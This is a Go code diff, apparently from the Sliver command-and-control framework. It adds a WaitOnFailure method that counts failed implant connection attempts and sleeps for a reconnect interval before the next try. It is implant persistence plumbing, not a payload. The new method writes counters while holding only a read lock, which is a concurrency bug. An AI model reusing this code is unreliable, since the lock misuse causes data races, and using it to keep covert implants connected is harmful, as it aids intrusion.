@@ -488,8 +488,23 @@ func (t *C2) registerSwitch(oldTransportID string, success bool) *sliverpb.Envel
 	}
 }
 
-// FailedAttempt - Notify an failed attempt to initiate
-// full Session/Beacon at some point in the stack.
+// WaitOnFailure - Notify an failed attempt to initiate full Session/Beacon
+// at some point in the stack, and wait until next reconnect duration expires
+func (t *C2) WaitOnFailure() {
+	t.mutex.RLock()
+	defer t.mutex.RUnlock()
+	if t.failures > 0 {
+		t.attempts = t.attempts + 1
+	}
+	t.failures = t.failures + 1
+
+	// The transport just sleeps for the duration specified
+	// as reconnect-on-failure interval (different from beacons intervals).
+	time.Sleep(time.Duration(t.Profile.Interval))
+}
+
+// FailedAttempt - Simply notify an failed attempt to initiate full Session/Beacon
+// at some point in the stack, but don't sleep for any interval.
 func (t *C2) FailedAttempt() {
 	t.mutex.RLock()
 	defer t.mutex.RUnlock()
